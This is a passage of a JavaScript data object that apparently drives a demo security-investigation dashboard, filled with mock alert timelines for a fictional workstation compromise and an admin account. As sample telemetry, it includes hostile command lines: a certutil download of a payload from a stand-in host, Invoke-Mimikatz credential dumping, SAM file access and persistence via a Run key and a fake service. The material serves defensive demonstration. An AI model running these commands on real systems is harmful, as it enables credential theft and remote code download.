            viewOnGraph: { nodeId:'alert-sam-access', label:'SAM Database Access Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-sam-access',
            details: { 'AMSI Detection':'Malicious', 'Content Preview':'Invoke-Mimikatz -DumpCreds (obfuscated)', 'Scan Result':'AMSI_RESULT_DETECTED', 'Action':'Allowed ⚠', 'MITRE':'OS Credential Dumping (T1003)' } }
        ]
      },
      registryModifications: {
        label: 'Registry Modifications', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:24', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'dev-ws045', label:'CORP-WS-045', icon:'🖥', sourceEntity:'proc-powershell' },
            details: { 'Operation':'SetValue', 'Key':'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'Value':'WinUpdateHelper', 'Data':'C:\\Windows\\Temp\\wuhelper.exe', 'Purpose':'Persistence — Run key' } },
          { time:'03 Apr 2026  15:36:26', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Operation':'SetValue', 'Key':'HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinUpdateSvc', 'Value':'ImagePath', 'Data':'C:\\Windows\\Temp\\wuhelper.exe', 'Purpose':'Service creation — masquerading as Windows Update' } },
          { time:'03 Apr 2026  15:36:27', dot:'orange',
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-enc-powershell',
            details: { 'Operation':'SetValue', 'Key':'HKLM\\SOFTWARE\\Microsoft\\AMSI\\Providers', 'Value':'(Modified)', 'Data':'Provider GUID removed', 'Purpose':'AMSI bypass attempt ⚠' } }
        ]
      },
      networkActivity: {
        label: 'Network Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:37:01', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'ip-tor', label:'185.220.101.42 (Tor)', icon:'🌐', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-c2-conn',
            details: { 'Destination IP':'185.220.101.42', 'Port':'443', 'Protocol':'HTTPS', 'Bytes Sent':'14.2 KB', 'Domain':'c2-relay.onion.ws', 'Direction':'Outbound' } },
          { time:'03 Apr 2026  15:36:45', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'ip-tor', label:'91.215.85.12 (Staging)', icon:'🌐', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-c2-conn',
            details: { 'Destination IP':'91.215.85.12', 'Port':'8080', 'Protocol':'HTTP', 'Bytes Sent':'2.1 KB', 'Domain':'staging-payload.net', 'Direction':'Outbound' } }
        ]
      },
      fileOperations: {
        label: 'File Operations', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'dev-ws045', label:'CORP-WS-045', icon:'🖥', sourceEntity:'proc-powershell' },
            details: { 'Operation':'Write', 'File Path':'C:\\Users\\m.henderson\\AppData\\Local\\Temp\\svchost_update.dll', 'File Size':'842 KB', 'Hash (SHA256)':'a3f4b8c1d9e2...7f6a', 'Signed':'No ⚠' } },
          { time:'03 Apr 2026  15:36:28', dot:'orange',
            viewOnGraph: { nodeId:'alert-sam-access', label:'SAM Access Alert', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-sam-access',
            details: { 'Operation':'Read', 'File Path':'C:\\Windows\\System32\\config\\SAM', 'File Size':'—', 'Hash (SHA256)':'N/A', 'Note':'Credential file access ⚠' } },
          { time:'03 Apr 2026  15:36:31', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Operation':'Write', 'File Path':'C:\\Windows\\Temp\\wuhelper.exe', 'File Size':'1.1 MB', 'Hash (SHA256)':'b7e2a1c4f8d3...9e5b', 'Signed':'No ⚠', 'Note':'Dropped malicious service binary' } }
        ]
      },
      childProcesses: {
        label: 'Child Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:35', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-cmd-child', label:'cmd.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Process':'cmd.exe', 'PID':'5120', 'Command':'cmd.exe /c whoami && ipconfig /all', 'MITRE':'System Information Discovery (T1082)' } },
          { time:'03 Apr 2026  15:36:40', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-certutil', label:'certutil.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Process':'certutil.exe', 'PID':'5244', 'Command':'certutil -urlcache -split -f http://staging-payload.net/beacon.dll', 'MITRE':'Ingress Tool Transfer (T1105)' } },
          { time:'03 Apr 2026  15:36:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-net', label:'net.exe', icon:'⚙', sourceEntity:'proc-powershell' },
            details: { 'Process':'net.exe', 'PID':'5312', 'Command':'net user /domain', 'MITRE':'Account Discovery (T1087.002)' } }
        ]
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-winupdatesvc', label:'WinUpdateSvc', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Service Name':'WinUpdateSvc', 'Relationship':'Installed via sc.exe create + registry modification', 'Binary':'C:\\Windows\\Temp\\wuhelper.exe', 'Status':'Running — Stop recommended' } },
          { time:'03 Apr 2026  14:33:15', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD Portal', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Service Name':'Azure AD Portal', 'Relationship':'Credentials used via AzureAD PowerShell module', 'User':'m.henderson', 'Status':'Active — Conditional Access review needed' } },
          { time:'03 Apr 2026  15:34:00', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-sharepoint', label:'SharePoint Online', icon:'🔧', sourceEntity:'proc-powershell' },
            details: { 'Service Name':'SharePoint Online', 'Relationship':'PnP.PowerShell used for bulk file download', 'Files':'142 files / 2.3 GB', 'Status':'Active — Access revoked' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-enc-powershell', label:'Encoded PowerShell', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-enc-powershell',
            detailsGrid: [
              { label:'15:36:22 Encoded PowerShell Execution', value:'Execution', tag:'Type', tagVal:'EDR', mitre:'T1059.001 (PowerShell)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] },
          { time:'03 Apr 2026  15:36:28', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-sam-access', label:'SAM Database Access', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-sam-access',
            detailsGrid: [
              { label:'15:36:28 SAM Database Access', value:'Credential Dumping', tag:'Type', tagVal:'EDR', mitre:'T1003 (OS Credential Dumping)', source:'CORP-WS-045', status:'Open', severity:'High' }
            ] },
          { time:'03 Apr 2026  15:37:01', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-c2-conn', label:'Outbound C2 Connection', icon:'🔔', sourceEntity:'proc-powershell' },
            alertProfileId: 'alert-c2-conn',
            detailsGrid: [
              { label:'15:37:01 Outbound Connection to Known C2', value:'C2 Communication', tag:'Type', tagVal:'NDR', mitre:'T1071 (Application Layer Protocol)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] }
        ]
      }
    }
  },
  'svc-winupdatesvc': {
    type: 'service', modalTitle: 'Service Details · WinUpdateSvc',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          riskScore: 88,
          maxScore: 100,
          severity: 'Critical',
          statusBadge: 'Masquerading Service',
          metrics: [
            { icon:'⚠', label:'Binary Signed', value:'No ✗', color:'#dc2626' },
            { icon:'🔗', label:'C2 Beacon', value:'Active', color:'#dc2626' },
            { icon:'📁', label:'Binary Path', value:'C:\\Temp (suspicious)', color:'#dc2626' },
            { icon:'🔧', label:'Startup Type', value:'Automatic', color:'#ea580c' },
            { icon:'🛡', label:'AV Detection', value:'Trojan.GenericKD', color:'#dc2626' },
            { icon:'📊', label:'Network Activity', value:'Periodic (5min)', color:'#ea580c' }
          ],
          firstSeen: '03 Apr 2026 15:36:22',
          lastActivity: '03 Apr 2026 15:37:01',
          investigationStatus: 'Active — Service stop recommended'
        }
      },
      serviceInfo: {
        label: 'Service Information', expanded: true,
        kv: { 'Service Name':'WinUpdateSvc', 'Display Name':'Windows Update Helper Service', 'Startup Type':'Automatic', 'Service Account':'NT AUTHORITY\\SYSTEM', 'Binary Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Status':'Running', 'Description':'Provides automated Windows patching (Suspicious)', 'Signature':'Not Signed ⚠', 'Created':'03 Apr 2026  15:35:50', 'Hash (SHA256)':'b7e2a1c4f8d3...9e5b', 'File Size':'1.1 MB', 'Legitimate Windows Service':'No — masquerading ⚠' }
      },
      serviceTimeline: {
        label: 'Service Events', expanded: true, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:35:50', dot:'red', malicious: true,
            details: { 'Event':'Binary Dropped', 'Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Dropped By':'powershell.exe (PID: 4892)', 'Size':'1.1 MB', 'Signed':'No ⚠' } },
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true,
            details: { 'Event':'Service Installed', 'Account':'NT AUTHORITY\\SYSTEM', 'Host':'CORP-WS-045', 'Method':'sc.exe create + registry modification' },
            action: { label:'⊘ Stop Service', type:'outline' } },
          { time:'03 Apr 2026  15:36:25', dot:'red', malicious: true,
            details: { 'Event':'Service Started', 'Account':'NT AUTHORITY\\SYSTEM', 'Outbound Connection':'185.220.101.42:443' } },
          { time:'03 Apr 2026  15:36:30', dot:'red', malicious: true,
            details: { 'Event':'C2 Beacon Established', 'Destination':'185.220.101.42:443 (Tor)', 'Interval':'60s beacon', 'Protocol':'HTTPS', 'User-Agent':'Mozilla/5.0 (mimicking browser)' } }
        ]
      },
      networkConnections: {
        label: 'Network Connections', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:30', dot:'red', malicious: true,
            details: { 'Destination':'185.220.101.42:443', 'Protocol':'HTTPS', 'Direction':'Outbound', 'Bytes Sent':'2.8 KB', 'Bytes Received':'14.2 KB', 'DNS':'c2-relay.onion.ws' } },
          { time:'03 Apr 2026  15:37:30', dot:'red', malicious: true,
            details: { 'Destination':'185.220.101.42:443', 'Protocol':'HTTPS', 'Direction':'Outbound', 'Bytes Sent':'1.2 KB', 'Bytes Received':'0.4 KB', 'Note':'Heartbeat/beacon' } },
          { time:'03 Apr 2026  15:38:30', dot:'red', malicious: true,
            details: { 'Destination':'91.215.85.12:8080', 'Protocol':'HTTP', 'Direction':'Outbound', 'Bytes Sent':'248 MB', 'Note':'Data exfiltration suspected' } }
        ]
      },
      fileDrops: {
        label: 'File Drops & Modifications', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:28', dot:'red', malicious: true,
            details: { 'Operation':'Create', 'Path':'C:\\Windows\\Temp\\wuhelper.exe', 'Size':'1.1 MB', 'Signed':'No', 'Hash':'b7e2a1c4f8d3...9e5b' } },
          { time:'03 Apr 2026  15:36:29', dot:'red', malicious: true,
            details: { 'Operation':'Create', 'Path':'C:\\Windows\\Temp\\wuhelper.dll', 'Size':'342 KB', 'Signed':'No', 'Note':'Support DLL for beacon' } },
          { time:'03 Apr 2026  15:36:31', dot:'orange',
            details: { 'Operation':'Modify', 'Path':'C:\\Windows\\System32\\drivers\\etc\\hosts', 'Note':'Added entry redirecting update.microsoft.com to 127.0.0.1', 'Purpose':'Block real Windows Update' } }
        ]
      },
      serviceDependencies: {
        label: 'Service Dependencies', expanded: false,
        kv: {
          'Depends On':'RpcSs (Remote Procedure Call)',
          'Required By':'None (standalone — suspicious for "update" service)',
          'Load Order Group':'(none)',
          'Start Type':'Auto — launches even without user login',
          'Recovery':'Restart on failure (auto-restart every 60s ⚠)',
          'Similar Legitimate Service':'wuauserv (Windows Update) — name confusion tactic'
        }
      },
      processes: {
        label: 'Spawned Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:32', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-rundll32', label:'rundll32.exe', icon:'⚙', sourceEntity:'svc-winupdatesvc' },
            details: { 'Process Name':'rundll32.exe', 'Parent Process':'wuhelper.exe', 'PID':'5580', 'Command Line':'rundll32.exe wuhelper.dll,ServiceMain', 'User':'NT AUTHORITY\\SYSTEM' } },
          { time:'03 Apr 2026  15:36:40', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'proc-cmd-svc', label:'cmd.exe', icon:'⚙', sourceEntity:'svc-winupdatesvc' },
            details: { 'Process Name':'cmd.exe', 'Parent Process':'wuhelper.exe', 'PID':'5612', 'Command Line':'cmd.exe /c netstat -an > C:\\Windows\\Temp\\net.log', 'User':'NT AUTHORITY\\SYSTEM' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:36:22', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-sus-service', label:'Suspicious Service', icon:'🔔', sourceEntity:'svc-winupdatesvc' },
            alertProfileId: 'alert-sus-service',
            detailsGrid: [
              { label:'15:36:22 Suspicious Service Installed', value:'Persistence', tag:'Type', tagVal:'EDR', mitre:'T1543.003 (Create/Modify System Process)', source:'CORP-WS-045', status:'Open', severity:'High' }
            ] },
          { time:'03 Apr 2026  15:36:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-tor-conn', label:'Outbound Tor Connection', icon:'🔔', sourceEntity:'svc-winupdatesvc' },
            alertProfileId: 'alert-tor-conn',
            detailsGrid: [
              { label:'15:36:30 Outbound Connection to Tor Exit Node', value:'C2 Communication', tag:'Type', tagVal:'NDR', mitre:'T1071 (Application Layer Protocol)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] },
          { time:'03 Apr 2026  15:38:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'alert-data-exfil', label:'Data Exfiltration', icon:'🔔', sourceEntity:'svc-winupdatesvc' },
            alertProfileId: 'alert-data-exfil',
            detailsGrid: [
              { label:'15:38:30 Potential Data Exfiltration', value:'Exfiltration', tag:'Type', tagVal:'DLP', mitre:'T1041 (Exfiltration Over C2 Channel)', source:'CORP-WS-045', status:'Open', severity:'Critical' }
            ] }
        ]
      },
      serviceTriggered: {
        label: 'Related Services', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  15:35:50', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD Portal', icon:'🔧', sourceEntity:'svc-winupdatesvc' },
            details: { 'Service Name':'Azure AD Portal', 'Relationship':'Compromised credentials originated from Azure AD sign-in', 'Status':'Active — Conditional Access review needed' } },
          { time:'03 Apr 2026  15:38:30', dot:'red', malicious: true,
            viewOnGraph: { nodeId:'svc-sharepoint', label:'SharePoint Online', icon:'🔧', sourceEntity:'svc-winupdatesvc' },
            details: { 'Service Name':'SharePoint Online', 'Relationship':'Exfiltrated data routed through C2 channel', 'Data Volume':'248 MB via HTTP', 'Status':'Active — Access revoked' } }
        ]
      }
    }
  },
  'user-admin': {
    type: 'user', modalTitle: 'User Activity · Administrator',
    sections: {
      riskSummary: {
        label: 'Risk Summary', expanded: true, noCollapse: true,
        summaryCard: {
          score: 28, maxScore: 100, severity: 'Low',
          metrics: [
            { label: 'Active Alerts', value: '0', color: '#16a34a' },
            { label: 'Failed Logins (7d)', value: '2', color: '#d97706' },
            { label: 'Risk Factors', value: '1', color: '#d97706' },
            { label: 'Compliance', value: 'OK', color: '#16a34a' }
          ],
          firstSeen: 'Jan 2024',
          lastActivity: '03 Apr 2026  10:15:00'
        }
      },
      usersDetails: {
        label: 'Users Details', expanded: true,
        kv: { 'Display Name':'Administrator', 'SAM Account Name':'admin', 'Email':'admin@contoso.com', 'Job Title':'Global Administrator', 'Department':'IT', 'Manager':'CISO (j.kim)', 'Last Logon Time':'03 Apr 2026  10:15:00', 'OU Name':'OU=Admins,DC=contoso,DC=local', 'Account Created':'2024-01-15', 'Password Last Set':'2026-03-01', 'MFA Status':'Enforced ✓', 'Privileged Role':'Global Admin, Exchange Admin' }
      },
      responseActions: {
        label: 'Quick Actions', expanded: true, noCollapse: true,
        actionButtons: [
          { icon: '🔒', label: 'Disable Account', desc: 'Disable in AD & Entra ID', severity: 'critical', action: 'disable-account' },
          { icon: '🔑', label: 'Force Password Reset', desc: 'Reset password & revoke sessions', severity: 'high', action: 'reset-password' },
          { icon: '📋', label: 'Audit Admin Actions', desc: 'Review recent admin activity', severity: 'medium', action: 'audit-admin' },
          { icon: '🛡', label: 'Review PIM Roles', desc: 'Check privileged role assignments', severity: 'info', action: 'review-pim' }
        ]
      },
      logonActivity: {
        label: 'Logon Activity', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  10:15:00', dot:'green', details: { 'Logon Type':'Interactive', 'Target Host':'DC-01', 'Source IP':'10.0.0.5', 'Status':'Success', 'MFA':'Hardware token ✓' } },
          { time:'03 Apr 2026  08:30:00', dot:'green', details: { 'Logon Type':'Remote Interactive (RDP)', 'Target Host':'DC-02', 'Source IP':'10.0.0.5', 'Status':'Success', 'MFA':'Approved' } },
          { time:'02 Apr 2026  16:45:12', dot:'green', details: { 'Logon Type':'Network', 'Target Host':'DC-01', 'Source IP':'10.0.0.10 (Admin Jump Server)', 'Status':'Success' } },
          { time:'02 Apr 2026  09:10:00', dot:'orange', details: { 'Logon Type':'Interactive', 'Target Host':'DC-01', 'Source IP':'10.0.0.5', 'Status':'Failed — Wrong Password', 'Note':'Followed by success at 09:10:45' } }
        ]
      },
      loginStatistics: {
        label: 'Login Statistics (30 days)', expanded: false,
        kv: {
          'Total Logins':'186',
          'Unique Source IPs':'3 (10.0.0.5, 10.0.0.10, 10.0.0.15)',
          'Unique Hosts':'4 (DC-01, DC-02, Admin-WS, Jump-Server)',
          'Failed Attempts':'2',
          'Off-Hours Logins':'12',
          'Weekend Logins':'4',
          'Avg Session Duration':'4h 22m',
          'MFA Challenges':'186 (100% pass rate)'
        }
      },
      cloudIdentities: {
        label: 'Cloud & Privileged Identities', expanded: false,
        kv: {
          'Azure AD Role':'Global Administrator',
          'PIM Status':'Eligible — activated 3x this week',
          'AWS IAM':'AdministratorAccess (cross-account)',
          'GCP':'Not configured',
          'Service Accounts Owned':'2 (svc-backup, svc-monitor)',
          'Last Role Review':'2026-03-15',
          'Conditional Access':'Admin-MFA-Always policy ✓'
        }
      },
      processes: {
        label: 'Processes', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  10:16:00', dot:'green',
            viewOnGraph: { nodeId:'proc-mmc', label:'mmc.exe', icon:'⚙', sourceEntity:'user-admin' },
            details: { 'Process Name':'mmc.exe', 'Parent Process':'explorer.exe', 'PID':'2340', 'Command Line':'mmc.exe dsa.msc', 'User':'admin' } },
          { time:'03 Apr 2026  10:20:00', dot:'green',
            viewOnGraph: { nodeId:'proc-ps-admin', label:'powershell.exe', icon:'⚙', sourceEntity:'user-admin' },
            details: { 'Process Name':'powershell.exe', 'Parent Process':'explorer.exe', 'PID':'2890', 'Command Line':'powershell.exe -Command Get-ADUser -Filter *', 'User':'admin' } }
        ]
      },
      serviceTriggered: {
        label: 'Services', expanded: false, viewAll: true,
        timeline: [
          { time:'03 Apr 2026  10:15:00', dot:'green',
            viewOnGraph: { nodeId:'svc-azure-ad', label:'Azure AD', icon:'⚙', sourceEntity:'user-admin' },
            details: { 'Service Name':'Azure AD', 'Action':'Sign-In', 'Status':'Success', 'Source':'DC-01' } },
          { time:'03 Apr 2026  10:16:30', dot:'green',
            viewOnGraph: { nodeId:'svc-exchange', label:'Exchange Admin Center', icon:'⚙', sourceEntity:'user-admin' },
            details: { 'Service Name':'Exchange Admin Center', 'Action':'Portal Access', 'Status':'Success', 'Source':'DC-01' } }
        ]
      },
      recentAlerts: {
        label: 'Recent Alerts', expanded: false, viewAll: true,
        timeline: [
          { time:'01 Apr 2026  22:15:00', dot:'orange',
            viewOnGraph: { nodeId:'alert-admin-offhours', label:'Admin Off-Hours Login', icon:'🔔', sourceEntity:'user-admin' },
            alertProfileId: 'alert-admin-offhours',
            detailsGrid: [
              { label:'22:15:00 Admin Login Outside Business Hours', value:'Policy Violation', tag:'Type', tagVal:'UEBA', mitre:'T1078 (Valid Accounts)', source:'DC-01', status:'Resolved', severity:'Medium' }
            ] }
        ]
      }
    }
  }
};

/* ── INVESTIGATION GRAPH FUNCTIONS ───────────────────────────── */

